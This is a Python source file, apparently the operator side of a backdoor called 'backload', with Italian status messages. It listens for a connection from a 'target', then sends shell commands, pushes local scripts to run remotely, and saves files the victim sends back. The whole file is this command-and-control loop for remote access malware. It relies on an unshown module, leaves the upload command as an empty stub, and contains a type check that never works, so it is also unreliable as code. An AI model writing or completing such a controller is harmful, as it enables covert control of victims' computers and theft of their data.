import os
import sys
import function
Connection = function.Connection()


try:
    inizializzation = Connection.INIT_CONN()
    if inizializzation == False:
        print("[err] impossibile inizializzare il socket")
        sys.exit()
    else:
        print("[*] socket inizializzato\n[*] in attesa di connessione")
except:
    print("[err] impossibile inizializzare il socket")
    sys.exit()
try:
    listen = Connection.LISTEN()
    if listen == False:
        print("[err] impossibile accogliere il client")
        sys.exit()
    else:
        print("[*] connessione stabilita con il targhet")
except:
    print("[err] impossibile accogliere il client")
    sys.exit()

while True:
    command = input("backload> ")
    if command.split(" ")[0] == "runscript" and len(command.split(" ")) == 2:
        filecontent = None
        script = command.split(" ")[1]

        try:
            filescript = open(script, "r")
            filecontent = filescript.read()
            filescript.close()

        except:
            print("[err] impossibile trovare il path dello script")

        if type(filecontent) != "<class 'str'>":
            Connection.SEND("scr" + filecontent)

    elif command.split(" ")[0] == "upload":
        filecontent = None


    else:
        try:
            Connection.SEND("com" + command)
        except:
            print("[err] connessione caduta")
            break
    response = Connection.RECV()

    if response != False:
        if response.split(b'@')[0] == b'file':
            file = open("download", "wb+")
            response = response.split(b'@')
            response.pop(0)
            payload = b''
            for index in response:
                payload = payload + index + b'@'
            payload = payload.decode("ascii", "ignore")
            payload = list(payload)
            payload.pop(-1)
            payload = "".join(payload).encode()
            file.write(payload)
            file.close()
            print("file ricevuto e salvato in 'download'")

        else:
            try:
                print(response.decode("ascii", "ignore"))
            except:
                print("[err] impossibile mettere in output il messaggio ricevuto")
    else:
        print("errore in 'Connection.RECV()'")
        pass